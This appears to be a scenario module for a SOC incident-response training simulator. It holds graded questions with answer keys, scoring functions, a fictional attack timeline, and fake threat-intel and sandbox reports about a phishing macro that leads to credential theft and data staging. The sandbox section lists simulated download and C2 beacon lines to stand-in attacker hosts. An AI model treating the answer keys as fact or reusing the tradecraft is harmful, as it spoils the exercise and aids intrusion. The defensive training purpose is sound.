          opt('T1048', 'T1048 Exfiltration Over Alternative Protocol'),
        ],
        key: { set: ['T1566.001', 'T1059.001', 'T1218.011', 'T1547.001', 'T1003.001', 'T1021.002', 'T1569.002', 'T1071.001', 'T1560.001'], explain: 'Each maps to logged activity. There is no exploit of a public application, no scheduled task, no spraying, no RDP, no encryption and no exfiltration in the evidence.' },
      },
      {
        id: 'severity', type: 'single', label: 'Validated severity', points: 2, sets: 'severity', summary: 'Severity',
        options: [opt('low', 'Low'), opt('medium', 'Medium'), opt('high', 'High'), opt('critical', 'Critical')],
        key: { accept: { critical: 1, high: 0.5 }, explain: 'A privileged service account is compromised and a file server holding payroll and banking data has an active implant with data staged for removal.' },
      },
      {
        id: 'declare', type: 'single', label: 'Decision', points: 2, summary: 'Decision',
        options: [
          opt('event', 'Handle as a security event; Tier 2 remediates'),
          opt('return', 'Return to Tier 1; evidence insufficient'),
          opt('incident', 'Declare a security incident and engage incident response (L3)'),
          opt('close', 'Close as false positive'),
        ],
        key: { accept: 'incident', explain: 'Multiple hosts, a privileged account and regulated data meet any reasonable incident threshold.' },
      },
    ],
  },

  {
    id: 'l3_response', label: 'L3 response', tier: 'L3', kind: 'response', weight: 20,
    intro: 'Contain, preserve evidence, eradicate, recover and notify. Actions take effect immediately and show in the live feed. Declare the response complete when the environment is clean and back in service.',
  },

  {
    id: 'closure', label: 'Closure', tier: 'L3', kind: 'form', weight: 10, attempts: 1, final: true, submitLabel: 'Close ticket',
    intro: 'Record the final disposition. Closing the ticket ends the exercise and releases the after-action review.',
    fields: [
      {
        id: 'disposition', type: 'single', label: 'Final disposition', points: 3, summary: 'Disposition',
        options: [
          opt('tp_noimpact', 'True positive, contained before any impact'),
          opt('fp', 'False positive'),
          opt('tp_incident', 'True positive, confirmed security incident'),
          opt('benign', 'Benign / authorised activity'),
          opt('dup', 'Duplicate of another ticket'),
        ],
        key: { accept: 'tp_incident', explain: 'Two hosts and two accounts were compromised and confidential data was collected. That is impact, even without exfiltration.' },
      },
      {
        id: 'root_cause', type: 'single', label: 'Root cause', points: 3,
        options: [
          opt('vuln', 'Unpatched vulnerability on an internet-facing server'),
          opt('weakpw', 'Weak or reused password guessed by the attacker'),
          opt('macro', 'User ran a macro-enabled attachment from a look-alike supplier domain; internet-origin macros were not blocked'),
          opt('insider', 'Deliberate action by an employee'),
          opt('misconfig', 'Cloud storage misconfiguration'),
        ],
        key: { accept: 'macro', explain: 'The mail passed SPF, DKIM and DMARC because the attacker owned the look-alike domain. The technical control that failed was macro execution for a Zone 3 file.' },
      },
      {
        id: 'impact', type: 'single', label: 'Impact statement', points: 3,
        options: [
          opt('ws_only', 'One workstation infected; no credential or data impact'),
          opt('exfil', 'Payroll and banking data confirmed stolen'),
          opt('staged', 'Two hosts and two accounts compromised; Finance data staged on FS01, no evidence it left the network'),
          opt('domain', 'Full domain compromise including domain controllers'),
        ],
        key: { accept: 'staged', explain: 'Overstating (confirmed theft, domain compromise) triggers the wrong legal process; understating hides the credential and data exposure.' },
      },
      {
        id: 'lessons', type: 'multi', label: 'Recommendations', points: 5,
        help: 'Select the controls this incident actually justifies.',
        options: [
          opt('macros', 'Block macros in Office files from the internet (and enforce the ASR rule against Office child processes)'),
          opt('pwall', 'Force a password reset for every user in the company'),
          opt('lsass', 'Enable LSASS protection (Credential Guard / RunAsPPL) and move EDR from detect-only to block'),
          opt('svc', 'Stop service accounts with server admin rights from logging on to workstations'),
          opt('noattach', 'Block all email attachments company-wide'),
          opt('egress', 'Remove direct internet egress from servers such as FS01'),
          opt('localadmin', 'Remove local administrator rights from standard users'),
          opt('fwvendor', 'Replace the perimeter firewall vendor'),
          opt('detect', 'Add detections for Office spawning script interpreters and for NTLM service-account logons from workstations'),
        ],
        key: { set: ['macros', 'lsass', 'svc', 'egress', 'localadmin', 'detect'], explain: 'Each selected control breaks a specific step in this chain. A company-wide reset, banning attachments or changing firewall vendor are disproportionate or unrelated to what failed.' },
      },
      { id: 'summary', type: 'longtext', label: 'Closure summary', min: 80, points: 1, help: 'Two or three sentences a manager could read without the case file.', key: { explain: 'Recorded in the case file.' } },
    ],
  },
];

function severed(st, host) {
  if (st.offline(host) || st.eradicated(host)) return 1;
  if (st.domainBlocked(IOC.c2Host) && st.ipBlocked(IOC.c2Ip)) return 1;
  if (st.domainBlocked(IOC.c2Host)) return 0.8;
  if (st.ipBlocked(IOC.c2Ip)) return 0.6;
  return 0;
}
const evidenceFirst = (st, host) => {
  const ev = st.evidence.get(host);
  if (ev === undefined) return 0;
  const erad = Math.min(st.cleaned.get(host) ?? Infinity, st.reimaged.get(host) ?? Infinity);
  return ev < erad ? 1 : 0;
};

const secret = {
  response: {
    scope: {
      hosts: [WS.name, FS.name],
      accounts: ['p.nair', 'svc_backup'],
      domains: [IOC.c2Host, IOC.stage2Host, IOC.senderDomain],
      ips: [IOC.c2Ip, IOC.stage2Ip, IOC.senderIp],
      hashes: [IOC.attachHash, IOC.dllHash, IOC.svcHash],
      senders: [IOC.senderAddr, IOC.senderDomain],
    },
    purgeTags: ['phish_email'],
    artifacts: {
      [WS.name]: [`Process rundll32.exe (PID ${PID.rundll}) terminated`, `File deleted: ${IOC.dllPath}`, 'Registry value deleted: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MsSync', `Cached attachment deleted: ${IOC.attachName}`],
      [FS.name]: [`Process msync_svc.exe (PID ${PID.svc}) terminated`, 'Service removed: MsSyncSvc', `File deleted: ${IOC.svcPath}`, `Staging archive quarantined: ${IOC.archive}`],
    },
    notify: { premature: ['customers', 'press', 'regulator'], prematureReason: 'no exfiltration has been established, so external notification is premature and is a decision for legal and the incident lead.' },
    contained: (st) => severed(st, WS.name) > 0 && severed(st, FS.name) > 0,
    objectives: [
      { id: 'contain_ws', label: 'Cut command-and-control on WS-FIN-014', points: 3, eval: (st) => severed(st, WS.name), explain: 'Isolating the workstation is the clean option: it stops the channel and preserves the host. Blocking only the domain or only the IP leaves the other route open.' },
      { id: 'contain_fs', label: 'Cut command-and-control on FS01', points: 3, eval: (st) => severed(st, FS.name), explain: 'FS01 has a SYSTEM-level implant and a staged archive. The outage from isolating it is smaller than the cost of the archive leaving.' },
      {
        id: 'block', label: 'Block attacker infrastructure organisation-wide', points: 3,
        eval: (st) => 0.45 * (st.domainBlocked(IOC.c2Host) ? 1 : 0) + 0.2 * (st.ipBlocked(IOC.c2Ip) ? 1 : 0) + 0.2 * (st.domainBlocked(IOC.stage2Host) ? 1 : 0) + 0.15 * (st.blockedSenders.has(IOC.senderAddr) || st.blockedSenders.has(IOC.senderDomain) ? 1 : 0),
        explain: 'Host isolation protects two machines. Blocking the C2 domain and IP, the download host and the sender protects every other host and mailbox, including the two unopened copies.',
      },
      {
        id: 'creds', label: 'Invalidate compromised credentials', points: 4,
        eval: (st) => (st.reset.has('svc_backup') ? 0.6 : st.disabled.has('svc_backup') ? 0.4 : 0) + (st.reset.has('p.nair') || st.disabled.has('p.nair') ? 0.4 : 0),
        explain: 'svc_backup is the account that matters most: it has admin rights on servers and its secret is known to the attacker. Resetting it is better than disabling it, which stops backups without changing the stolen secret.',
      },
      {
        id: 'purge', label: 'Remove the phishing email from all mailboxes', points: 2,
        eval: (st, ctx) => {
          const need = ctx.stream.events.filter((e) => (e._tags || []).includes('phish_email')).map((e) => e.id);
          return st.purges.some((p) => need.every((id) => (p.matched || []).includes(id))) ? 1 : 0;
        },
        explain: 'Two recipients have not opened it yet. Until it is purged, the incident can restart from either mailbox.',
      },
      { id: 'evidence', label: 'Preserve forensic evidence before eradication', points: 3, eval: (st) => 0.5 * evidenceFirst(st, WS.name) + 0.5 * evidenceFirst(st, FS.name), explain: 'Memory holds the implant configuration and the operator\'s commands. Once a host is cleaned or rebuilt that is gone.' },
      { id: 'eradicate', label: 'Remove the implant from both hosts', points: 4, eval: (st) => (st.reimaged.has(WS.name) ? 0.5 : st.cleaned.has(WS.name) ? 0.35 : 0) + (st.eradicated(FS.name) ? 0.5 : 0), explain: 'A workstation where an operator held admin rights should be rebuilt rather than cleaned. FS01 can be remediated in place because every artefact is identified.' },
      { id: 'recover', label: 'Return hosts to service after eradication', points: 1, eval: (st) => 0.5 * (st.eradicated(WS.name) && !st.offline(WS.name) ? 1 : 0) + 0.5 * (st.eradicated(FS.name) && !st.offline(FS.name) ? 1 : 0), explain: 'An incident is not finished while a file server is still isolated. Release only after eradication.' },
      { id: 'notify', label: 'Notify the right stakeholders', points: 2, eval: (st) => 0.4 * (st.notified.has('ir_lead') ? 1 : 0) + 0.3 * (st.notified.has('data_owner') ? 1 : 0) + 0.3 * (st.notified.has('legal') ? 1 : 0), explain: 'The incident lead owns the response, the data owner must know payroll and banking files were collected, and legal decides whether staging without exfiltration triggers any notification duty.' },
    ],
  },

  truth({ t0 }) {
    const T = (off) => t0 + off * 1000;
    return {
      summary: 'A look-alike of supplier Baltic Carrier Lines mailed a macro-enabled "overdue invoice" to three Finance users. Priya Nair opened it. The macro launched hidden PowerShell from Excel, which downloaded a loader DLL, ran it through rundll32, set a Run key and began beaconing over HTTPS once a minute. Because she is a local administrator, the operator could read LSASS memory and recover the backup service account, which runs on every managed host. They used it to install a service on FS01 over the admin share and archived the Payroll and Banking shares to a staging file. Nothing had been exfiltrated when the alert fired. The only alert came from a network analytics rule; the endpoint agent recorded every step but is in detect-only mode with no rule for Office spawning PowerShell.',
      timeline: [
        { ts: T(AT.email), text: `Email from ${IOC.senderAddr} with ${IOC.attachName} delivered to p.nair, d.okafor and l.brandt.` },
        { ts: T(AT.open), text: 'p.nair opens the attachment in Excel on WS-FIN-014.' },
        { ts: T(AT.ps), text: `Excel launches hidden, encoded PowerShell, which downloads from ${IOC.stage2Host}.` },
        { ts: T(AT.run), text: 'msync.dll written under %APPDATA%\\MsSync and started with rundll32; Run key set.' },
        { ts: T(AT.beaconWs), text: `First beacon to ${IOC.c2Host} (${IOC.c2Ip}).` },
        { ts: T(AT.discovery), text: 'Discovery: whoami, Domain Admins, domain controllers, FS01 shares, running services.' },
        { ts: T(AT.lsass), text: 'rundll32 reads LSASS memory; svc_backup credentials recovered.' },
        { ts: T(AT.lateral), text: 'NTLM logon to FS01 as svc_backup from WS-FIN-014; msync_svc.exe copied to ADMIN$.' },
        { ts: T(AT.svc), text: 'Service MsSyncSvc installed and started on FS01 as SYSTEM; FS01 begins beaconing.' },
        { ts: T(AT.stage), text: 'Finance\\Payroll and Finance\\Banking archived with 7-Zip.' },
        { ts: T(AT.archive), text: `Archive ${IOC.archive} (about 400 MB) written. No upload follows.` },
        { ts: T(6), text: 'NET-0142 fires on the WS-FIN-014 beacon pattern.' },
      ],
      iocs: [
        { type: 'domain', value: IOC.c2Host, note: 'Command and control' },
        { type: 'ip', value: IOC.c2Ip, note: 'Command and control' },
        { type: 'domain', value: IOC.stage2Host, note: 'Second-stage download' },
        { type: 'ip', value: IOC.stage2Ip, note: 'Second-stage download' },
        { type: 'email', value: IOC.senderAddr, note: 'Phishing sender (look-alike domain)' },
        { type: 'ip', value: IOC.senderIp, note: 'Sending mail server' },
        { type: 'sha256', value: IOC.attachHash, note: IOC.attachName },
        { type: 'sha256', value: IOC.dllHash, note: 'msync.dll loader' },
        { type: 'sha256', value: IOC.svcHash, note: 'msync_svc.exe service binary' },
      ],
    };
  },
};

function intel({ t0 }) {
  const host = 'AS64511 VPS-HOSTLINE (NL)';
  return {
    [IOC.c2Host]: {
      verdict: 'suspicious', detections: '0/89',
      facts: [['Registered', daysAgo(t0, 6)], ['Registrar', 'NameRelay Ltd'], ['Resolves to', IOC.c2Ip], ['Hosting', host], ['TLS certificate', 'Domain-validated, issued 6 days ago'], ['Proxy category', 'Uncategorized'], ['Global prevalence', 'Very low']],
      notes: ['No vendor detections. The domain is newly registered and no known software vendor publishes telemetry endpoints under it.'],
    },
    [IOC.c2Ip]: {
      verdict: 'suspicious', detections: '2/89',
      facts: [['Network', host], ['Passive DNS', `${IOC.c2Host} (6 days); 14 other short-lived domains in the last 90 days`], ['Open ports', '443/tcp'], ['Vendor tags', 'Generic HTTPS C2 listener (2 vendors, low confidence)']],
      notes: ['Rented virtual server that has hosted a rotating set of young domains.'],
    },
    [IOC.stage2Host]: {
      verdict: 'malicious', detections: '4/89',
      facts: [['Registered', daysAgo(t0, 9)], ['Registrar', 'NameRelay Ltd'], ['Resolves to', IOC.stage2Ip], ['Hosting', host], ['Vendor tags', 'Malware distribution (4 vendors)']],
      notes: ['Reported as serving script loaders over plain HTTP.'],
    },
    [IOC.stage2Ip]: {
      verdict: 'malicious', detections: '3/89',
      facts: [['Network', host], ['Passive DNS', `${IOC.stage2Host} (9 days)`], ['Open ports', '80/tcp'], ['Vendor tags', 'Malware distribution (3 vendors)']],
      notes: [],
    },
    [IOC.senderDomain]: {
      verdict: 'suspicious', detections: '0/89',
      facts: [['Registered', daysAgo(t0, 4)], ['Registrar', 'NameRelay Ltd'], ['Mail authentication', 'SPF and DKIM published and valid'], ['Similar to', 'balticcarrierlines.example (registered 2009, established supplier)']],
      notes: ['Look-alike of an existing supplier domain. Passing SPF/DKIM/DMARC shows only that the sender controls this domain.'],
    },
    [IOC.senderIp]: {
      verdict: 'suspicious', detections: '1/89',
      facts: [['Network', 'AS64499 MAILBURST-VPS (LT)'], ['Passive DNS', `mail.${IOC.senderDomain} (4 days)`], ['Vendor tags', 'Bulk mail source (1 vendor)']],
      notes: [],
    },
    [IOC.attachHash]: {
      verdict: 'unknown', detections: '0/72',
      facts: [['File name', IOC.attachName], ['Type', 'Excel macro-enabled workbook'], ['First submitted', 'Never']],
      notes: ['Not seen before by any vendor. The mail gateway retained a copy, so the sandbox can detonate it.'],
    },
    [IOC.dllHash]: {
      verdict: 'malicious', detections: '3/72',
      facts: [['File name', 'msync.dll'], ['Type', 'PE32+ DLL, unsigned'], ['First submitted', '2 days ago'], ['Vendor tags', 'Trojan loader / generic backdoor (3 vendors)']],
      notes: [],
    },
    [IOC.svcHash]: {
      verdict: 'suspicious', detections: '1/72',
      facts: [['File name', 'msync_svc.exe'], ['Type', 'PE32+ service executable, unsigned'], ['First submitted', 'Never before today']],
      notes: ['Shares code sections with msync.dll.'],
    },
  };
}

const sandbox = {
  [IOC.attachHash]: {
    verdict: 'malicious', score: 94,
    facts: [['File', IOC.attachName], ['Type', 'Excel macro-enabled workbook'], ['Sample source', 'Mail gateway retention']],
    behaviours: ['Workbook_Open macro runs as soon as content is enabled', 'Starts powershell.exe with a hidden window and an encoded command', 'PowerShell downloads a script and runs it in memory', 'Writes a DLL under %APPDATA%\\MsSync and starts it with rundll32.exe', 'Adds a Run key value named MsSync'],
    network: [`GET http://${IOC.stage2Host}/a/update.ps1`, `GET http://${IOC.stage2Host}/a/msync.dat`, `HTTPS ${IOC.c2Host}:443, repeated about every 60 s`],
    dropped: [`%APPDATA%\\MsSync\\msync.dll  SHA-256 ${IOC.dllHash}`],
  },
  [IOC.dllHash]: {
    verdict: 'malicious', score: 97,
    facts: [['File', 'msync.dll'], ['Type', 'PE32+ DLL, unsigned'], ['Export called', 'Start']],
    behaviours: ['Beacons over HTTPS with a hard-coded Chrome 104 user agent', 'Accepts tasking: shell command, file transfer, process memory read, remote service install', 'Can deploy itself to another host as a service binary'],
    network: [`HTTPS ${IOC.c2Host}:443, 60 s interval with jitter`],
    dropped: [],
  },
  [IOC.svcHash]: {
    verdict: 'malicious', score: 95,
    facts: [['File', 'msync_svc.exe'], ['Type', 'PE32+ service executable, unsigned']],
    behaviours: ['Registers as a Windows service and runs as SYSTEM', 'Same beacon protocol and configuration as msync.dll'],
    network: [`HTTPS ${IOC.c2Host}:443, 60 s interval with jitter`],
    dropped: [],
  },
};

export default {
  id: 's01-beacon',
  historySeconds: 45 * 60,
  catalog: {
    title: 'Periodic outbound connections to a newly observed domain',
    queue: 'network analytics',
    blurb: 'A network analytics rule flags a workstation contacting an uncategorised domain at a fixed interval. Work the ticket from the alert queue to closure.',
    difficulty: 'Intermediate',
    minutes: '40-60',
    tiers: 'L1, L2, L3',
    sources: ['proxy', 'dns', 'email', 'edr', 'winsec', 'firewall', 'audit'],
    environment: 'Aero Freight Systems, about 30 hosts. Web egress is logged at the proxy; firewall logs cover inter-VLAN and inbound traffic. Endpoint telemetry is Sysmon-style and the EDR policy is detect-only. All times are UTC.',
  },
  build,
  alert: { at: 6, build: (stream, c) => beaconAlert(stream, c, 'c2_ws', WS, 6, 'A1') },
  relatedAlerts: [
    {
      id: 'A2', at: 400,
      when: (st) => severed(st, FS.name) === 0,
      build: (stream, c) => beaconAlert(stream, c, 'c2_fs', FS, 400, 'A2'),
    },
  ],
  stages,
  flow(stageId, { values }) {
    if (stageId === 'l1_triage' && values.decision !== 'escalate') {
      return { result: 'Overruled', notes: [{ actor: 'SOC shift lead', text: 'QA review: this ticket cannot be closed or held at Tier 1. The traffic has not been attributed to any authorised software. Escalation to Tier 2 is required; prepare the handoff.' }] };
    }
    if (stageId === 'l2_validation' && values.declare !== 'incident') {
      return { result: 'Overruled', notes: [{ actor: 'SOC manager', text: 'Decision overruled: the case file meets the threshold for incident declaration. Incident declared and incident response engaged.' }] };
    }
    return null;
  },
  intel,
  sandbox,
  assetNotes: {
    FS01: ['Outbound web access through PROXY01 is permitted for this server by legacy rule "Servers-to-Web" (flagged in the last firewall audit, not yet removed).'],
    'WS-FIN-014': ['Backup agent installed; runs as AEROFREIGHT\\svc_backup.'],
  },
  accountNotes: {
    svc_backup: ['Password last changed 412 days ago.'],
  },
  changes: [],
  secret,
  // Exposed for the automated end-to-end test only (server-side import).
  _test: {
    IOC, UA,
    tools: { l2_validation: [['sweep', IOC.c2Host], ['reputation', IOC.c2Host], ['proctree', 'WS-FIN-014'], ['sandbox', IOC.attachHash]] },
  },
};
